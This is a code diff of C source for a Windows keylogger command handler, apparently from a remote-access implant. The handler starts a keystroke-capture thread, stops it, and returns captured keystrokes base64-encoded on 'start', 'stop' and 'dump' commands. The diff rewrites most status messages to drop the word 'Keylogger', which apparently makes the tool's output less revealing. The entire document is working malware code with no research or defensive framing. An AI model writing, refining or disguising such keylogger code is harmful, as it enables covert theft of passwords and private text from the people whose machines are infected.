@@ -100,7 +100,7 @@ static DWORD WINAPI KeyloggerThread(LPVOID param) {
 static void handle_keylogger(const char *args, char *out_b64) {
     if (!args || !args[0] || strcmp(args, "start") == 0) {
         if (InterlockedAdd(&g_keylog_running, 0)) {
-            b64_encode((unsigned char*)"Keylogger already running", 25, out_b64);
+            b64_encode((unsigned char*)"Already active", 14, out_b64);
             return;
         }
         InterlockedExchange(&g_keylog_pos, 0);
@@ -109,13 +109,13 @@ static void handle_keylogger(const char *args, char *out_b64) {
         g_keylog_thread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, &g_keylog_tid);
         if (!g_keylog_thread) {
             InterlockedExchange(&g_keylog_running, 0);
-            b64_encode((unsigned char*)"Failed to start keylogger", 25, out_b64);
+            b64_encode((unsigned char*)"Failed to initialize", 20, out_b64);
         } else {
-            b64_encode((unsigned char*)"Keylogger started", 17, out_b64);
+            b64_encode((unsigned char*)"Started", 7, out_b64);
         }
     } else if (strcmp(args, "stop") == 0) {
         if (!InterlockedAdd(&g_keylog_running, 0)) {
-            b64_encode((unsigned char*)"Keylogger not running", 21, out_b64);
+            b64_encode((unsigned char*)"Not active", 10, out_b64);
             return;
         }
         InterlockedExchange(&g_keylog_running, 0);
@@ -130,7 +130,7 @@ static void handle_keylogger(const char *args, char *out_b64) {
         if (pos > 0)
             b64_encode((unsigned char*)g_keylog_buf, (size_t)pos, out_b64);
         else
-            b64_encode((unsigned char*)"Keylogger stopped (no keystrokes captured)", 42, out_b64);
+            b64_encode((unsigned char*)"Stopped (no data)", 17, out_b64);
         InterlockedExchange(&g_keylog_pos, 0);
     } else if (strcmp(args, "dump") == 0) {
         LONG pos = InterlockedAdd(&g_keylog_pos, 0);
@@ -152,7 +152,7 @@ static void handle_keylogger(const char *args, char *out_b64) {
             b64_encode((unsigned char*)"No keystrokes captured yet", 26, out_b64);
         }
     } else {
-        const char *msg = "Usage: keylogger [start|stop|dump]";
+        const char *msg = "Specify: start, stop, or dump";
         b64_encode((unsigned char*)msg, strlen(msg), out_b64);
     }
 }
